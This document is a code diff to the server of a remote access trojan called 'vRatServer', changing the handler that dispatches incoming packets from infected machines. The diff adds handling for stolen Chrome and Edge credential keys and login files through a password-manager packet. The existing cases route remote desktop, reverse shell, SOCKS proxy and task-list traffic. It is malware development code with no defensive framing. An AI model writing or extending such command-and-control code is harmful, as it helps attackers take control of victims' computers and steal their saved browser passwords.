@@ -14,7 +14,7 @@ namespace vRatServer.Classes
         public byte[] idp;
         public byte com;
         public int size;
-
+        
         ~ClientPacket()
         {
             
@@ -31,6 +31,7 @@ namespace vRatServer.Classes
             this.data = new byte[size];
             this.size = size;
             Array.Copy(data, 0, this.data, 0, size);
+            Array.Clear(data, 0, size);
 
 
 
@@ -47,7 +48,7 @@ namespace vRatServer.Classes
             {
 
                 case (byte)globals.PacketType.Rdp:
-                    new RdpPacket(client, data);
+                    new RdpPacket(client, ref data);
                     break;
                 case (byte)globals.PacketType.sysinfo:
                     new sysinfo(data, client, com);
@@ -65,10 +66,29 @@ namespace vRatServer.Classes
                     new ReverseShellPacket(client, data);
                     break;
                 case (byte)globals.PacketType.socksdata:
-                    new ClientProxy(client, data, idp);
+                    new ClientProxy(client, ref data, idp);
                     break;
                 case (byte)globals.PacketType.tasklist:
                     new TaskManagerPacket(client, data);
+                    break;
+                case (byte)globals.PacketType.getondis:
+                    new OnDisPacket(client, data);
+                    break;
+                case (byte)globals.PacketType.chromekey:
+                case (byte)globals.PacketType.edgkey:
+                case (byte)globals.PacketType.edglogfile:
+                case (byte)globals.PacketType.chromelogfile:
+                    new PasswordManagerPacket(client, data, com);
+                    break;
+                case (byte)globals.PacketType.zipdone:
+                    if (client.fmf != null) {
+                        Program.f1.BeginInvoke((Action)(() =>
+                        {
+                            client.fmf.refresFileList();
+                            MessageBox.Show("Zip done", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }));
+
+                    }
                     break;
                 default:
                     break;
@@ -78,7 +98,7 @@ namespace vRatServer.Classes
 
             }
 
-
+            GC.Collect();
 
         }
 
